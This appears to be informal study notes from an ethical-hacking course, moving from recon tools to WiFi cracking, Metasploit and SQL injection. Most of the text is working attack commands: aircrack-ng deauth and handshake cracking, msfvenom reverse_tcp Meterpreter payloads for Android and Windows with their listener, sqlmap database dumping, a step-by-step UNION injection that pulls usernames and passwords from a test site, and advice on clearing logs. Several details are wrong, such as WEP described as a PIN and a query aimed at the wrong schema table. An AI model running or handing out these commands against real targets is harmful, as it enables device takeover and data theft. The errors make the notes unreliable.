TOE- target of evolution
Scope- your task is scope(hacking amazon.com)

White hat hacking- with written permission(NDA- Non Disclosure agreement, without nda you cant perform hacking), we are provided all the details
Grey hart- partial information is provided(guest login is provided but we have to find ips)
Black hat- Zero knowledge( no pre knowledge is provided for the hackers)

Zero day attack- a vulnerability whose solution is unknown

Security audit- check if a company is following security policies
Vulnerability assessment -
Penetration test-

Elements of hacking?information security
Confidentiality
Integrity
Availability
Authenticity
Non repudiation

Phases of ethical hacking-
1-Information gathering: Gathering information about the target(facebook)

redhawk
Nslookup
Pipl-people search
Social engineering- check his social media
Virustotal.com- you can put file there and check what all anti virus are able to detect it
Dumpster diving- gain information from garbage
Observation- what are people talking in company , are they talking about username or password
Wpscan- scans wordpress sites


2-Scanning:
Type of scanning:
a)Port scan: check for the open ports, 
Nmap
Wireshark
Burpsuit-give a list and it will fire the list on input fields

b)Vulnerability scan
Nessus
Acunetix
Nmap
Nikto
Id server

3-Gaining access:
Exploit-db
Rapid7


4-Maintaining Access
Privilige escalation(nmap --interactive)
Binding payload with bakground running applications

5-Covering tracks/clearing logs
Whatever you did while ethical hacking for com

Csrf- cross site request forgery
Id server
Temp mail


1’ OR ‘1’=’1
Shodan.io - checks for the iot devices connected to net
‘https://www.exploit-db.com/
Sqlmap- does all kinds of sql injection automatically on website
Google docs
Inurl:passwords.txt


Wifi hacking

Airmon-ng start wlan0
It enables the monitor mode

Airodump-ng wlan0mon
Scan the access point in range


Airodump-ng wlan0mon --bssid 64:66:B3:E2:8D:14 -c 6 -w A1
To know how many devices are connected to a particular router

Aireplay-ng -0 0 -a 64:66:B3:E2:8D:14 wlan0mon
Capture handshake, -0 deauth, 0 infinite amount of packets

Aircrack-ng -w /root/Desktop/rockyou.txt A1-01.cap

Automated wifi hacking tools
Wifite
Fluxion
Airgeddon
Wifi phisher
Lazy script

Pmkid-pair wise master key identification
Beacons- shows live access points

Wep-wired equivalent protection, 6 digit pin is there
Wps-wifi protected setup

Alternatives of kali linux
Arch backbox centos debian parrot

Payload creation:

msfvenom -p android/meterpreter/reverse_tcp LHOST=*** LPORT=***  R>filename.apk

Msfvenom: payload creation
-p: payload
 Android: defines the platform
Meterpreter: gaining all access
Reverse_tcp: creating  backgate tunnel for host and the victim
LHOST: listenig host, ip address
LPORT: listening port, eg 4444
R: rawfile


Listener:
Terminal:- msfconsole
 In msfconsole
1)  use exploit/multi/handler
2) set payload android/meterpreter/reverse_tcp
 3) set lhost ***
4) set lport ***
5) exploit 
Or 
Run

SQlinjection

Sqlmap -u url --dbs

--dbs:extracts database

Sqlmap -u url -D database_name --tables
Get the tables from database

Sqlmap -u url -D database_name -T table_name -columns
To fetch column data

Sqlmap -u url -D database_name -T table_name -C column_name --dump

--dump:to save



Types of xss
Stored xss

reflected xss

Windows hacking

Payload creation:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=*** LPORT=*** -f exe -o filename.exe  



Use:
Shell
For executing shell command


Manual SQLInjection attack:
site= testphp.vulnweb.com/artists.php

1)testphp.vulnweb.com/artists.php/artists=1’
Putting comma to check for error

2)testphp.vulnweb.com/artists.php/artists=1 ORDER BY 1
testphp.vulnweb.com/artists.php/artists=1 ORDER BY 2
..
testphp.vulnweb.com/artists.php/artists=1 ORDER BY n

To check how many pages are connected to database

3)testphp.vulnweb.com/artists.php/artists=1 UNION SELECT 1,2,3

Basically do 1,2,3,,,,,n

4)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,2,3
Providing wrong input to database due to which it showed that theres an artists named table on 2

5)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,database(),3
Will give database name

6)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,version(),3
To check database version


7)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,current_user(),3
Will give current user

8)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables where table_schema=database() LIMIT 0,1

0,1
1,1
2,1
3,1
Keep checking till where it goes

9)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables where table_schema=database()
The tables list will be fetched

10)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.tables where table_name=’users’
Will give columns

11)testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,group_concat(uname),3 FROM users
Will give login username
testphp.vulnweb.com/artists.php/artists=-1 UNION SELECT 1,group_concat(test),3 FROM users
Will give password



Keylogger:

sAINT
(git library)

Windows store id pass in ‘SAM’ folder
Linux stores id pass in ‘etc/shadow’ folder in encrypted format which can be decrypted  johnthereeper and hashcat


Mac changing:

Ifconfig eth0 down
This wil switch off interface
Macchanger -m eth0
This will change the mac

Ifconfig eth0 up
Start interface

Macchanger -r eth0
Randomly changes mac

When system reboots original mac address comes back
